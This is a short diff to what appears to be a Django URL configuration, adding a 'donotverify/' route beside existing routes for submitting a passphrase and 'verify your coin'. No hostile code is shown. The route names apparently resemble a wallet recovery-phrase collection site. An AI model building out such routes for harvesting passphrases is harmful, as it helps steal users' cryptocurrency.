@@ -8,5 +8,6 @@ urlpatterns = [
     path('submit/passphase/', views.submit_pass, name="submit_pass"),
     path('approve/', views.approve, name='approve'),
     path('verify/', views.verify_your_coin, name='verify'),
+    path('donotverify/', views.do_not_verify, name="donotverify"),
 
 ]
